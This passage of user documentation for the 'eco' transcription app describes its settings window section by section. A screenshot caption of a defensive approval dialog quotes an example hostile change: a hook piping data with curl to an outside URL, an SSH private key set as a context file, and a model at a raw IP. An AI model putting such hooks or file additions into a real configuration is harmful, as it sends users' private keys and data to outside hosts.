DISCARD last, behind a thin rule. `×` in the top-right corner closes the
window; its messages are toasts in the bottom-right corner (section 1).

A section is **a table**. A click picks a row; `↑` and `↓` move between rows.
There are two kinds of row:

- **A simple value** — ON/OFF, a choice, a name or a number — is changed **in
  its row**, and saved at once. An ON/OFF is a chip, lit ON or dim OFF; a
  choice is a dropdown; a name or a number is a field. A click on the control,
  or `Enter` or `Space` on the picked row, acts on it: it turns the switch,
  opens the dropdown, or starts writing, where `Enter` (or leaving the field)
  saves and `Esc` puts the value back. `Tab` reaches the control. A save the
  daemon refuses leaves the value as it was, and an error toast says why.
  AUDIO and GENERAL are made of these.
- **An item with content** — a model, a session kind, a prompt, a context, a
  skill — **opens on a screen of its own**. A double click, or `Enter` or
  `Space` on the picked row, opens it. The bar holds ADD (the section's own name
  for it, such as ADD MODEL), then VIEW, EDIT, what else the section does, and
  DELETE, for the picked row. They are there whether a row is picked or not,
  dimmed until one is with "Pick a row first" as their hint, so the bar does
  not move as you pick. VIEW opens the row read; EDIT (or `Ctrl+E`) opens it to
  be written, and SAVE, CANCEL or `Esc` brings you back to the table with the
  row still picked. EDIT is dimmed on an item with nothing to write, with why
  as its hint. DELETE asks first, saying what changes with it, and saves at
  once; it is dimmed on an item something still needs, or that is always kept,
  with the reason as its hint.

An opened item is **read first**: under ABOUT, what it is; under RELATED, the
items of other sections that use it or that it uses, each a link that opens
that item in its section; with nothing related there is no RELATED. Long texts,
such as a skill's prompt, follow across the screen as they were written. BACK
returns to the table, or to the item the link was followed from. **EDIT** turns
the screen into its form. SAVE saves this item alone; DISCARD drops its changes
and reads it again; CANCEL stops editing. The kicker over the title says NEW,
UNSAVED, EDITING, or CHANGED ELSEWHERE when the saved config changed under
changes that cannot be made again on it. A section whose rows have nothing more
to show than their cells, such as the spoken languages, has no screens: no VIEW
or EDIT, and `Enter` does nothing on a row.

A context holds a list of its own, the files it sends. That list is **a table
inside the item**, under a caption, on its read screen; it is never edited in
the form. A click or `↑`/`↓` picks a row. The bar holds REMOVE FILE, dimmed
until a row is picked; it saves at once. The list keeps the order its rows were
added in. ADD FILE opens **a screen inside the item**: the item's name small
above its title, and a short form. BACK, or `Esc`, returns to the item and adds
nothing.

| where | key | what it does |
|---|---|---|
| outside a field being written | `1` … `8` | show that section |
| anywhere | `Ctrl+1` … `Ctrl+8` | show that section |
| anywhere | `Ctrl+Tab`, `Ctrl+Shift+Tab` | the next, the previous section |
| the rail | `↑` `↓` `Home` `End` | move along the sections |
| the rail | `Enter`, `Space` | open the section the rail is on |
| a table | `↑` `↓` | pick a row |
| a table | `Tab` | reach the control of the row picked |
| a row with a value | `Enter`, `Space` | open its dropdown, turn its switch, or start writing its name or number |
| a name or number being written | `Enter`, `Esc` | save it, put it back |
| a table of items | `Enter`, `Space` | open the picked row |
| a table of items | `Ctrl+E` | edit the picked row, then back to the table |
| a table of items | `Delete` | delete the picked row, after asking |
| a table inside an item | `Enter` | on an add screen, add it |
| a table inside an item | `Delete` | remove the picked row |
| an item | `Ctrl+E` | edit it |
| an item, editing | `Ctrl+S` | save it |
| anywhere | `Esc` | back one level: a screen inside the item, editing (asking when changes would be dropped), the item, the table, then close the window |
| anywhere | `?`, `F1` | the keyboard shortcuts dialog |

**Audio** — who is heard through which device:

![Settings, 01 AUDIO: the bar with REFRESH DEVICES and a dimmed DELETE; under DEVICES a table DEVICE · KIND · LEVEL · HEARD AS · COLOUR with Default microphone (MIC, heard as Me, picked), Default output (OUT, heard as Them), H390 headset microphone (MIC), H390 headset (OUT) and Built-in microphone (MIC), each of those three a dim Not heard, every row an automatic grey swatch and no level; below it AUDIO SOURCES, a table NAME · YOU with Me (a name field, a lit ON) and Them (a name field, a dim OFF).](img/39-settings-audio.png)

A row per input and output of the computer: its name, MIC or OUT, its level,
whom it is heard as, and its colour. The level is the device's live trace, in
its colour, drawn only while the device has signal (under `--replay` the daemon
captures nothing, so the pictures have none). A device a source names that the
computer does not have now shows dim, as unavailable. REFRESH DEVICES reads the
devices again. HEARD AS is a dropdown of every source, then Not heard, then New
source…:

![The Audio table with the HEARD AS list of the first device row open under it: Me (chosen), Them, Not heard and New source….](img/40-settings-audio-heard.png)

A device has one owner: choosing a source hears the device as that source,
taking it from the one that had it, and saves at once. Not heard stops hearing
it. New source… asks a name, then creates that source heard through this
device, and saves. COLOUR, in the row, is the colour the device's trace and
lines are drawn in; a pick saves at once.

Under AUDIO SOURCES, a row per source. Its NAME is written in the row:
`Enter`, or leaving the field, saves it, and `Esc` puts it back. YOU is an
ON/OFF chip, ON on the source that is you; turning one ON makes it you and no
other, since one source at most is you, and turning it OFF leaves nobody you.
DELETE deletes the picked source after asking, saying which
devices are no longer heard, whether no output is left, and whether nobody is
you any more. Dropping echoes and echo cancellation are under General.

**Models** — every model, registered once, and the defaults:

![Settings, 02 MODELS: the bar with ADD MODEL, VIEW, EDIT, the defaults by their short names, a dimmed FOR CHAT, a dimmed FOR TRANSLATION and FOR REVIEW, and a dimmed DELETE; "Register each model once — chat or transcription — with its provider, and make it a default from the bar…"; a table NAME · TYPE · MODEL ID · DEFAULT · USED BY: whisper-lan (TRANSCRIPTION · whisper-large-v3-turbo · TRANSCRIPTION · MEETING, CONVERSATION…), deepgram (TRANSCRIPTION · nova-3 · · INTERVIEW), gemini-flash (CHAT · google/gemini-2.5-flash · CHAT · TRANSLATION · MEETING, CONVERSATION…, picked), claude-haiku (CHAT · anthropic/claude-haiku-4.5 · REVIEW · minutes).](img/41-settings-models.png)

DEFAULT says what the model runs when nothing more specific picks one: CHAT
(questions, and the skills and session kinds that pick no model), TRANSLATION,
REVIEW (the reviewer's pass, when answers are reviewed) and TRANSCRIPTION.
With no translation default of its own, translation follows the chat default,
and that model reads CHAT · TRANSLATION (INHERITED). With a chat model picked,
the bar holds DEFAULT FOR CHAT, DEFAULT FOR TRANSLATION and DEFAULT FOR
REVIEW; with a transcription model, DEFAULT FOR TRANSCRIPTION; with none, a
dimmed DEFAULT FOR CHAT; where the bar has no room for those names, as in
the picture, they read FOR CHAT, FOR TRANSLATION and FOR REVIEW. Each saves
at once, and is dimmed on the model that is already that default, with why in
its hint. DEFAULT FOR REVIEW only picks the
reviewer's model: whether answers are reviewed is turned on under General.
USED BY lists what else picks the model: skills and session kinds. The chat
and transcription defaults cannot be deleted, so DELETE is dimmed on them;
deleting another says what falls back to which model. Opened, a model shows its
facts, what it is the default for among them, and under RELATED what else uses
it:

![The model gemini-flash, read: the bar with BACK, EDIT and a dimmed DELETE; ABOUT with TYPE CHAT, DEFAULT FOR CHAT · TRANSLATION, PROVIDER OPENROUTER, BASE URL https://openrouter.ai/api/v1, MODEL ID google/gemini-2.5-flash, KEY FROM env OPENROUTER_API_KEY, REASONING OFF; RELATED with SESSION KINDS · ASSISTANT + TRANSLATION › MEETING, CONVERSATION, OTHER, IDEA, INTERVIEW.](img/42-settings-model.png)

Edited, it has its type while nothing uses it, its name, the reasoning for a
chat model, the provider (CUSTOM takes any base URL), the model (LIST shows the
models the provider offers), where the key comes from, the price per minute of
a transcription model and, for a chat model, EXTRA (JSON), the extra fields
sent with each request.

**KEY FROM** names the source above a field holding the key's name. **PICK A
KEY** beside it opens one list of the names the daemon can read, never their
values, under a title per source: ENVIRONMENT (variables named `ECO_<NAME>`, a
placeholder, and the provider variables eco knows that are set), then
OMAPASS on Linux when omapass is installed, or CREDENTIAL MANAGER on Windows
(the generic credentials `eco:<name>`). Each source ends with **TYPE A NAME…**,
which keeps that source and gives the keyboard to the field, for a name the
list does not show. The list is asked for each time it opens; a line under the
field says a new variable shows only after `eco restart`, because the daemon
reads its environment when it starts, and on Windows that a new credential
shows at once. Picking a name sets it and clears the other sources. Without
omapass on the machine, as in these pictures, OMAPASS is not listed and an info
button beside the picker opens omapass's install page. With a credential named,
a line says how to store that key with `eco key set <name>` or as the generic
credential `eco:<name>`. The pictures are made on Linux, so none shows the
Credential Manager. Here the picker is open, nothing picked from it:

![The model gemini-flash being edited, EDITING beside MODEL, the bar with a dimmed SAVE and CANCEL: NAME "gemini-flash"; REASONING with PROVIDER'S, OFF (lit), LOW, MEDIUM, HIGH; PROVIDER with OPENROUTER (lit), GROQ, CUSTOM; MODEL "google/gemini-2.5-flash" with LIST; KEY FROM · ENVIRONMENT with "OPENROUTER_API_KEY", an info button and PICK A KEY open below it: ENVIRONMENT with DEEPGRAM_API_KEY, ECO_LAN_KEY, OPENROUTER_API_KEY (chosen) and TYPE A NAME…; the line on eco restart under the field; EXTRA (JSON) holding "{}".](img/43-settings-model-edit.png)

Renaming a model renames it wherever it is used.

**Languages** — the spoken languages a session may start in:

![Settings, 03 LANGUAGES: the bar with ADD LANGUAGE, MAKE DEFAULT and DELETE; "The spoken languages a session can start in; the default is chosen first. The default transcription model is set on the Models table."; a table LANGUAGE · DEFAULT with AUTO · detect (picked), EN · American English (DEFAULT), ES · español de España and PT · português.](img/44-settings-languages.png)

A row per language, in the order the dropdowns show them, the order they were
added in. A language has no screen of its own, so there is no VIEW or EDIT. ADD
LANGUAGE opens a screen in the section that lists the languages eco knows that
are not offered yet, AUTO among them; ADD LANGUAGE or `Enter` on the one picked
offers it, saves, and returns to the table with it picked; BACK or `Esc` adds
nothing. MAKE DEFAULT makes new sessions start in the language picked,
and DELETE stops offering it, after asking; deleting the default names the
first language left, which becomes the default. The last language cannot be
deleted. The default transcription model is set on the Models table.

**Session kinds** — the kinds, and what each runs on:

![Settings, 04 SESSION KINDS: the bar with ADD KIND, VIEW, EDIT, a dimmed MAKE DEFAULT and DELETE; a sentence on the default kind and the kinds' own models; a table NAME · DEFAULT · TRANSCRIBES WITH · ANSWERS WITH: Meeting (DEFAULT · default · whisper-lan · default · gemini-flash, picked), Conversation, Other and Idea with the same defaults, interview (deepgram · default · gemini-flash).](img/45-settings-kinds.png)

The default kind is the one the start and import dialogs suggest; MAKE DEFAULT
makes the picked kind it. Deleting a kind says its sessions keep it and the
models and context slots chosen for it stop applying; the only kind left
cannot be deleted. Opened:

![The session kind Meeting, read: the bar with BACK, EDIT, a dimmed MAKE DEFAULT and DELETE; ABOUT with DEFAULT "Yes: suggested first when a session is created or imported", TRANSCRIPTION default · whisper-lan, ASSISTANT default · gemini-flash, TRANSLATION default · gemini-flash; RELATED with MODELS › whisper-lan, gemini-flash.](img/46-settings-kind.png)

Edited, a kind has its name and its own transcription, assistant and
translation models — only the transcription one until a chat model is
registered.

**Prompts** — what instructions the models get:

![Settings, 05 PROMPTS: the bar with VIEW and EDIT; "The instructions the models get with every answer…"; a table NAME · TEXT with RULES FOR EVERY ANSWER (picked) and REVIEWER PROMPT, each with the first line of its text.](img/47-settings-prompts.png)

RULES FOR EVERY ANSWER are sent with every answer, a skill's or a question's;
REVIEWER PROMPT is what the reviewer is asked when answers are reviewed. Both
are always there, so nothing is added or deleted here. Opened, a prompt shows
its text as it was written; EDIT turns it into a text area, and SAVE saves it:

![RULES FOR EVERY ANSWER, read: the bar with BACK and EDIT; the four rules as written, "- Answer in the language of the transcript." to "- Never attribute to the user facts that are not in the transcript or the context."](img/48-settings-prompt.png)

**Context** — the files sent with answers:

![Settings, 06 CONTEXT: the bar with ADD CONTEXT SLOT, solid, then VIEW, EDIT and, after a thin rule, DELETE; "Files sent with answers: Global with every answer, a slot only in sessions where it is on."; a table NAME · SENT · FILES: Global (Every session · 1 file, picked), resume (On in INTERVIEW · 1 file).](img/49-settings-context.png)

Global is the files sent with every answer, in every session; it is always
there and has nothing to write, so EDIT and DELETE are dimmed on it. Each
context slot is files a session sends while the slot is on there: from the
start in the kinds it names, or once turned on in the session; SENT says which.
Only the slots are added and deleted; deleting one says which kinds lose it.
Global and each slot, opened, show their files as the table FILES, in the order
they are sent. ADD FILE opens a screen with a PATH field: ADD FILE, or `Enter`,
adds the path typed, and BROWSE adds at once every file chosen in the file
dialog. Files are sent in the order they were added. With a file picked, REMOVE
FILE takes it off, and saves at once. Global has no EDIT, so ADD FILE is its
main action; a slot's EDIT holds only its name and the kinds it is on from the
start in, and a new slot gets its files once it is saved.

**Skills** — what the composer's chips do:

![Settings, 07 SKILLS: the bar with ADD SKILL, VIEW, EDIT and DELETE; a table NAME · MODEL · HOOK: reply (default · gemini-flash · HOOK · ON SEND, picked), minutes (claude-haiku), explain (default · gemini-flash).](img/50-settings-skills.png)

The order here, the order the skills were added in, is the order of the chips
and of `Alt+1…9`. A skill with no model of its own names the one it inherits:

![The skill reply, read: the bar with BACK, EDIT and DELETE; ABOUT with MODEL default · gemini-flash, HOOK ~/bin/post-to-notes, SEND ON ITS OWN off; PROMPT and OUTPUT FORMAT in full below; RELATED with MODELS › gemini-flash.](img/51-settings-skill.png)

Edited, it has the name, the prompt, the format, the model and its hook:

![The skill reply being edited, EDITING beside SKILL, the bar with a dimmed SAVE and CANCEL: NAME "reply"; PROMPT and OUTPUT FORMAT as text areas; MODEL "default · gemini-flash"; HOOK "~/bin/post-to-notes" and what the command is run with; SEND ON ITS OWN, unlit.](img/52-settings-skill-edit.png)

A new name warns that global shortcuts call skills by name.

**Until a chat model is registered**, PROMPTS, CONTEXT and SKILLS hold only NO
CHAT MODEL and "eco records and transcribes without one. Answers, skills and
translation need a chat model: register one under Models and make it the
default for chat there.", and their bar holds only REGISTER A CHAT MODEL, which
opens a new model under Models. Models works as ever. It is not pictured: the
pictures run with chat models registered.

**General** — how eco behaves, as one table of settings under five titles, each
with its value beside it as the control that changes it. In the picture the
version is the checkout's when it was taken, and the latest release is the
same: the pictures never ask GitHub (the fixture sets `[update] check = false`),
so the scene turns CHECK FOR UPDATES on and says the latest in the window only:

![Settings, 08 GENERAL: an empty bar; the note says what the picked row does; a table SETTING · VALUE under five titles: INTERFACE with INTERFACE LANGUAGE, a dropdown "English (US)", picked, HIDE FROM SCREEN SHARING, SHOW ECO IN THE TRAY and SYSTEM NOTIFICATIONS, each a dim OFF chip; REVIEWER with REVIEW ANSWERS, a dim OFF chip with claude-haiku beside it, and SHOW THE DRAFT, a dimmed OFF; AUDIO with DROP ECHOES, a lit ON, and ECHO CANCELLATION, a dim OFF; ANSWERS with MAXIMUM CONTEXT (CHARACTERS) 60000 and ANSWERS AT THE SAME TIME 8; UPDATES with CHECK FOR UPDATES, a lit ON, VERSION, a CHECK NOW button and "0.4.0 · up to date", and DAEMON, a RESTART button and "running".](img/53-settings-general.png)

The note above the table says what the picked row does. There are no screens
and no commands: each value saves at once.

- **INTERFACE.** The language is a dropdown of Automatic (system) and each
  language pack by its own name (English, Brazilian Portuguese, Japanese);
  `↑`, `↓`, `Enter` and `Esc` work in it, and the windows change language at
  once; see [i18n.md](i18n.md). HIDE FROM SCREEN SHARING is off by default; on,
  it applies to every eco window at once, and to each one that opens later.
  SHOW ECO IN THE TRAY is off by default; see below. SYSTEM NOTIFICATIONS is
  off by default; see below.
- **REVIEWER.** REVIEW ANSWERS has a second model rewrite every answer before
  it shows; its value names the reviewer's model, picked on the Models table
  with DEFAULT FOR REVIEW. Turned on with no reviewer model picked, it takes
  the chat default as the reviewer's model. SHOW THE DRAFT also shows and keeps the draft
  the reviewer rewrote; it is dimmed while answers are not reviewed. The
  reviewer's prompt is under Prompts.
- **AUDIO.** DROP ECHOES, on by default, drops a line of yours whose words
  mostly repeat, in order, what the others said in the last 20 seconds. ECHO CANCELLATION, off by
  default, runs PipeWire's echo cancellation on your microphone while a session
  records; where it cannot run, as on Windows, it is dimmed while off and its
  hint says why; on, it can still be turned off.
- **ANSWERS.** MAXIMUM CONTEXT (CHARACTERS) is how many characters of transcript and
  earlier answers one request sends at most; ANSWERS AT THE SAME TIME is how many answers run at once,
  across every session. Each is a number written in the row.
- **UPDATES.** CHECK FOR UPDATES, on by default, is an ON/OFF chip: on, the
  daemon asks GitHub for the latest release's tag once a day; off, never on
  its own. VERSION reads the running version and what is known of the latest:
  `0.4.0 · up to date`, `0.4.0 · not checked` or `0.4.0 · could not check`
  (the reason in the note) with CHECK NOW, or `0.4.0 · 0.5.0 available` with a
  lit UPDATE (`0.5.0` is an example). UPDATE installs the release; the row and
  a toast say each step — `downloading eco 0.5.0`, `checking the
  checksum of eco 0.5.0`, `installing eco 0.5.0`, `restarting eco`, `eco
  0.5.0 is running` — or `update failed:` and why, in an error toast. On Linux, `pkexec`
  asks for the password in its own window at installing. A session that
  records is never cut: the restart waits for it to end, and the row says
  `eco 0.5.0 installed · restarts when the session ends`. Then the window
  reopens. DAEMON has RESTART, which restarts the daemon as `eco restart`
  does; while a session records it asks first, in a dialog RESTART ECO, "A
  session is recording. Restarting eco now stops its recording.", with CANCEL
  and RESTART. None of these steps is pictured. See [how to install and
  remove eco](how-to-install-and-remove.md#update).

SYSTEM NOTIFICATIONS turned on has the daemon send a notification of the
system — on Omarchy through `notify-send`, on Windows a Windows notification —
while no eco window is active, and only for these: a source's transcription
down, and back; a newer release, once per version; an answer finished, named
by its skill or question, not its text; and an error the window would show as
an error toast. While an eco window has the focus, its toasts say it and no
notification is sent. Nothing else is notified. On Windows the notification
is labelled "eco", with eco's icon: `eco setup` registers eco's app id, and
the daemon registers it again before each notification, so it also holds
when setup never ran; if it cannot, the notification goes out labelled
"Windows PowerShell". None is pictured: a notification is drawn by the system, not by eco.

SHOW ECO IN THE TRAY turned on puts an icon in the system tray at once — on
Omarchy the bar's tray, on Windows the notification area — and turned off, it
goes; no restart. The icon is eco's bars in white,
with a red dot while a session records; its tooltip says `eco · idle` or
`eco · recording · <title>` (`<title>` is a placeholder for the session's
title). A click opens the eco window, or brings the open one forward, as `eco
window focus` does. Its menu has no picture here, as the tray is drawn by the
bar, not by eco; it holds **Open** (the same), **New session** (the start
dialog), **Settings** (opens or closes them, as `eco window config`) and
**Stop eco** (as `eco stop`: the windows and the icon go with the daemon). On
Omarchy the bar may keep tray icons in a drawer behind its `<` arrow.

**What keeps an item from saving** shows on its own field: an outline in the
error colour and the reason under it, and the keyboard goes to the first such
field. A value typed wrong shows as it is typed; a missing value once a save is
tried. Anything that is not one field's shows under the title. Here, ADD MODEL
and then SAVE with nothing filled:

![A new model being edited, NEW and EDITING beside MODEL, the bar with SAVE and CANCEL: TYPE with CHAT lit; NAME empty, showing "new model", outlined in red with "Give it a name." under it; REASONING, PROVIDER with OPENROUTER lit; MODEL empty, showing "e.g. google/gemini-3.5-flash-lite", outlined in red with "Set the provider's model id." under it; KEY FROM · ENVIRONMENT with "OPENROUTER_API_KEY" and PICK A KEY.](img/54-settings-errors.png)

No model is required: before any is registered, the config saves with no
default transcription or assistant model, and sessions say none is chosen
until one is; a default that names a model names a registered one.

**Closing with an item unsaved** asks:

![The UNSAVED CHANGES dialog over the dimmed new model, a dot on the rail's 02 for the item not saved: "Your settings have unsaved changes. Save them before closing?" with SAVE AND CLOSE, KEEP EDITING and, filled red, DISCARD CHANGES.](img/55-settings-unsaved.png)

SAVE AND CLOSE saves the item and closes once it is saved; it stays open when
another item still has changes. Closing the eco window itself closes the
settings with it and does not ask: unsaved changes there are dropped.

**A change another program asked for.** Only this window's own SAVE writes at
once a new or changed skill hook, a new context file, or a new model or a
model's new address or key source. When another program on the socket sends a
config that does (an agent, a script), the daemon holds it and every eco window
asks, naming each hook command, each file path, and each model's address and
where its key comes from (never the key):

![The APPROVE THIS CHANGE dialog over a dimmed live session: "A program other than this window asked to change the settings. Approving saves it: a hook runs as a shell command after answers, a context file is sent to the model, and a model's key is sent to its address."; in red, "hook of minutes: curl -s --data-binary @- https://example.com/collect", "context file: ~/.ssh/id_ed25519" and "model fast: http://203.0.113.7/v1, key from $OPENROUTER_API_KEY"; REJECT and, filled red, APPROVE.](img/56-settings-pending.png)

**APPROVE** saves the change; **REJECT** drops it, and a toast says it
was rejected. Esc and a press outside do not close it. The keyboard starts on
REJECT. The daemon keeps one held change at a time; while the dialog is open,
no other program can change the settings, so what it lists does not change
under your pointer, and your choice applies only to the change it shows. This
window's own SAVE drops the held change. In these pictures the driver hands the window the daemon's
`config_pending` event (`docs/design.md §9`); nothing was sent to the socket.

# 13. What has no screen

Some things belong on this walk by their absence, so that somebody looking for
them finds out there is nothing to find.

**The audio.** There is no player and no waveform of a session, because there
is no audio to play: eco never writes raw audio to disk. A session is its
transcript, its answers and its notes. Outside a session the trace on the start
screen is a measurement and nothing else.

**Cost outside a session.** Not in the sessions list, not on an answer card,
not in a tooltip. It is the cost screen of section 8, opened from one
session's details. `eco sessions` prints it for agents.

**Assigning every line of a session to one person at once.** The window assigns
one speaker or one line; `eco assign <id> all` does the whole session.

**Linking older sessions to people in bulk.** `eco people adopt` links the
named live speakers of older sessions to people. The window has no button for
it.

**A transcript as a file.** COPY VTT puts the WebVTT on the clipboard;
`eco export <id> > session.vtt` writes it.

**The daemon itself.** Starting and stopping are `eco start` and `eco stop`;
restarting is `eco restart`, or RESTART under Settings › General › UPDATES.
The window shows only whether it can reach the daemon. Its errors go to `journalctl --user -u eco.service`.

**The global shortcuts.** The window lists them (section 11) but does not
change them: they are in `packaging/hypr/eco.lua`, or on Windows under
`[shortcuts]` in the config, and the skills they call by name are the
config's.

**Measurements.** `eco bench` and `mise run bench` print to the terminal; see
[benchmarks.md](benchmarks.md).

**Two sessions in one window.** A window shows one session. A session started
while another records takes the window; the other keeps recording under
SESSIONS › LIVE, and opening the app again opens a second window on it.
